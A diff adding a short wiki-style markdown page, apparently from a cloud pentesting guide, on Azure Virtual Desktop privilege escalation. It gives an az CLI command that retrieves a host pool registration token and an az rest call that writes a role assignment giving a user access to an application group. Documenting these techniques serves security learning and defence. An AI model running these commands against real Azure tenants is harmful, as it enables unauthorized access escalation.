@@ -1,0 +1,32 @@
+# Az - Virtual Desktop Privesx
+
+## Azure Virtual Desktop Privesc
+
+For more info about Azure Virtual Desktop check:
+
+### `Microsoft.DesktopVirtualization/hostPools/retrieveRegistrationToken/action`
+You can retrieve the registration token used to register virtual machines within an host pool.
+
+```bash
+az desktopvirtualization hostpool retrieve-registration-token -n testhostpool -g Resource_Group_1
+```
+
+### Microsoft.Authorization/roleAssignments/read, Microsoft.Authorization/roleAssignments/write
+
+> [!WARNING]
+> An attacker with these permissions could do things much more dangerous than this one.
+
+With this permissions you can add a user assignment to the Application group, which is needed to access the virtual machine of the virtual desktop:
+
+```bash
+az rest --method PUT \
+  --uri "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP_NAME>/providers/Microsoft.DesktopVirtualization/applicationGroups/<APP_GROUP_NAME>/providers/Microsoft.Authorization/roleAssignments/<NEW_ROLE_ASSIGNMENT_GUID>?api-version=2022-04-01" \
+  --body '{
+    "properties": {
+      "roleDefinitionId": "/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleDefinitions/1d18fff3-a72a-46b5-b4a9-0b38a3cd7e63",
+      "principalId": "<USER_OBJECT_ID>"
+    }
+  }'
+```
+
+Note that in order for a user to be able to access a Desktop or an app, he also needs the role `Virtual Machine User Login` or `Virtual Machine Administrator Login` over the VM.
